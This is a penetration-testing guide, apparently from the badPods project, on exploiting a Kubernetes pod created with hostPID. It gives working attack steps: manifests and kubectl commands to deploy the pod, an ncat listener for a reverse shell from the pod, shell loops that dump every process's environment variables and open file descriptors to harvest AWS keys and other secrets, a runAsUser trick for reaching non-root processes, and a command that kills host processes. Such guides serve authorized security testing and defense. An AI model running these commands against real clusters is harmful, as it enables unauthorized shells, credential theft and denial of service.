# Bad Pod #5: hostPID 
![](../../.github/images/Pod5.jpg)

There’s no clear path to get root on the node with only `hostPID`, but there are still some good post exploitation opportunities.  
*	**View processes on the host** – When you run ps from within a pod that has hostPID: true, you see all the processes running on the host, including processes running within each pod. 
*	**View the environment variables for each pod on the host** - With hostPID: true, you can read the /proc/[PID]/environ file for each process running on the host, including all processes running in pods. 
*	**View the file descriptors for each pod on the host** - With hostPID: true, you can read the /proc/[PID]/fd[X] for each process running on the host, including all of the processes running in pods. Some of these allow you to read files that are opened within pods. 
*	**Look for passwords, tokens, keys, etc.** – If you are lucky, you will find credentials and you’ll be able to use them to escalate privileges within the cluster, to escalate privileges services supported by the cluster, or to escalate privileges services that cluster-hosted applications are communicating with. It is a long shot, but you might find a Kubernetes service account token or some other authentication material that will allow you to access other namespaces and eventually escalate all the way up to cluster admin. 
*	**Kill processes** – You can also kill any process on the node (presenting a denial-of-service risk), but I would advise against it on a penetration test!

## Table of Contents
- [Bad Pod #5: hostPID](#bad-pod-5-hostpid)
  - [Table of Contents](#table-of-contents)
- [Pod creation & access](#pod-creation--access)
  - [Exec pods](#exec-pods)
  - [Reverse shell pods](#reverse-shell-pods)
  - [Deleting resources](#deleting-resources)
- [Post exploitation](#post-exploitation)
  - [View all processes running on the host and look for passwords, tokens, keys, etc.](#view-all-processes-running-on-the-host-and-look-for-passwords-tokens-keys-etc)
  - [View the environment variables for each pod on the host](#view-the-environment-variables-for-each-pod-on-the-host)
  - [View the file descriptors for each pod on the host](#view-the-file-descriptors-for-each-pod-on-the-host)
  - [Also, you can also kill any process, but don't do that in production :)](#also-you-can-also-kill-any-process-but-dont-do-that-in-production-)
  - [Attacks that apply to all pods, even without any special permissions](#attacks-that-apply-to-all-pods-even-without-any-special-permissions)
- [Demonstrate impact](#demonstrate-impact)
- [References and further reading:](#references-and-further-reading)

# Pod creation & access

## Exec pods
Create one or more of these resource types and exec into the pod

**Pod**  
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpid/pod/hostpid-exec-pod.yaml
kubectl exec -it hostpid-exec-pod -- bash
```
**Job, CronJob, Deployment, StatefulSet, ReplicaSet, ReplicationController, DaemonSet**

* Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 

```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpid/[RESOURCE_TYPE]/hostpid-exec-[RESOURCE_TYPE].yaml 
kubectl get pods | grep hostpid-exec-[RESOURCE_TYPE]      
kubectl exec -it hostpid-exec-[RESOURCE_TYPE]-[ID] -- bash
```

*Keep in mind that if pod security policy blocks the pod, the resource type will still get created. The admission controller only blocks the pods that are created by the resource type.* 

To troubleshoot a case where you don't see pods, use `kubectl describe`

```
kubectl describe hostpid-exec-[RESOURCE_TYPE]
```

## Reverse shell pods
Create one or more of these resources and catch the reverse shell

**Step 1: Set up listener**
```bash
ncat --ssl -vlp 3116
```

**Step 2: Create pod from local manifest without modifying it by using env variables and envsubst**

* Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 
* Replace the HOST and PORT values to point the reverse shell to your listener
* 
```bash
HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/hostpid/[RESOURCE_TYPE]/hostpid-revshell-[RESOURCE_TYPE].yaml | kubectl apply -f -
```

**Step 3: Catch the shell**
```bash
$ ncat --ssl -vlp 3116
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: Listening on :::3116
Ncat: Listening on 0.0.0.0:3116
Connection received on 10.0.0.162 42035
```

## Deleting resources
You can delete a resource using it's manifest, or by name. Here are some examples: 
```
kubectl delete [type] [resource-name]
kubectl delete -f manifests/hostpid/pod/hostpid-exec-pod.yaml
kubectl delete -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpid/pod/hostpid-exec-pod.yaml
kubectl delete pod hostpid-exec-pod
kubectl delete cronjob hostpid-exec-cronjob
```

# Post exploitation

## View all processes running on the host and look for passwords, tokens, keys, etc. 
```bash
ps -aux
...omitted for brevity...
root     2123072  0.0  0.0   3732  2868 ?        Ss   21:00   0:00 /bin/bash -c while true; do ./my-program --grafana-uername=admin --grafana-password=admin; sleep 10;done
...omitted for brevity...
```
Check out that clear text password in the ps output below! 

## View the environment variables for each pod on the host
The following command lists the environ file for each process if the process is running as UID 0. See the note below on how to access PIDs running as a non-root UID. The command then uses `xargs` to split up the output so that each environment variable is on it's own line:

```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done > envs.txt
```

Now it's time to look for interesting environment variables. 
```bash
root@hostpid-exec-pod:/# less envs.txt
...omitted for brevity...

/proc/578808/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=envar-demo
NPM_CONFIG_LOGLEVEL=info
NODE_VERSION=4.4.2
DEMO_FAREWELL=Such a sweet sorrow
DEMO_GREETING=Hello from the environment
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
...omitted for brevity...
```
Oh look, an AWS IAM user key and secret! 

**Note: This only works on containers, not the host**

As far as I know, there is no way to get the environment variables from the host processes. This only works for other containers. 

**Note: To get environment variables for processes owned by a non-root user, you need to do some extra work**

The for loop shown above only grabs environment variables from processes running within pods that share same UID as your hostPID pod. By default, the badPods run as UID 0. Using our current `hostpid` pod, let's see what other pids are running:

```bash
root@hostpid-exec-pod:/# ps auxn | awk '{print $1}' | sort | uniq -c | sort -rn
    205 0
      9 999
      8 1000
      5 101
      1 USER
      1 104
      1 103
      1 102
      1 1001
      1 100
      1 1
```
You can see that most processes on my cluster are running as root, but there are 9 PIDs running as UID 999. The only way I know to get the environment variables from those processes is to run a new pod with the runAsUser set to the desired UID. Thanks to @rkervella for figuring that one out! Here's an example:

```bash
 cat hostpid-exec-pod-999.yaml
apiVersion: v1
kind: Pod
metadata:
  name: hostpid-exec-pod-999
  labels:
    app: pentest
spec:
  securityContext:
    runAsUser: 999
    runAsGroup: 999
  hostPID: true
  containers:
  - name: hostpid-pod-999
    image: ubuntu
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
```

Now let's try it again from within our new pod running as UID/GID 999:

```bash
I have no name!@hostpid-exec-pod-999:/$ for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
...omitted for brevity...
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=argocd
ARGOCD_METRICS_PORT=tcp://10.96.157.195:8082
ARGOCD_REPO_SERVER_PORT=tcp://10.97.112.203:8081
ARGOCD_REPO_SERVER_PORT_8084_TCP_PROTO=tcp
ARGOCD_REPO_SERVER_PORT_8084_TCP_PORT=8084
ARGOCD_SERVER_PORT_80_TCP_PORT=80
```

There we go! At some point I'll probably automate this so that I can spin up a new pod for each UID on the host. 

## View the file descriptors for each pod on the host
The following command lists out the file descriptors for each PID that we have access to. See the note below on how to access FDs for non-root PIDs.

```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
```

Now it's time to look for interesting files. Oh look, a vim swp file!
```bash
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
lrwx------ 1 root root 64 Jun 15 02:26 /proc/635975/fd/0 -> /dev/null
l-wx------ 1 root root 64 Jun 15 02:26 /proc/635975/fd/1 -> pipe:[65069205]
```

Let's see what's in `/.secret.txt.swp`. This file exists within a container, but we can access it by reading `/proc/635813/fd/4`!

```bash
cat /proc/635813/fd/4
3210#"! UtadBnnmAWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLEAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEYI'm going to keep my secrets in this file!
```
More secrets! 

**To access the FDs for PIDs owned by a non-root user, you need to do some extra work**

The note about permissions in the previous section applies here as well. To access the file descriptors associated with processes within containers that are not running as UID 0, you'll need to spin up additional pods - one pod per UID you see on the host.  


## Also, you can also kill any process, but don't do that in production :)
```
pkill -f "nginx" 
```

## Attacks that apply to all pods, even without any special permissions
* Cloud metadata service
* `Kube-apiserver` or `kubelet` with `anonymous-auth` enabled
* Kubernetes exploits
* Hunting for vulnerable application/services in the cluster

# Demonstrate impact

If you are performing a penetration test, the end goal is not to gain cluster-admin, but rather to demonstrate the impact of exploitation. Use the access you have gained to accomplish the objectives of the penetration test.

# References and further reading: 
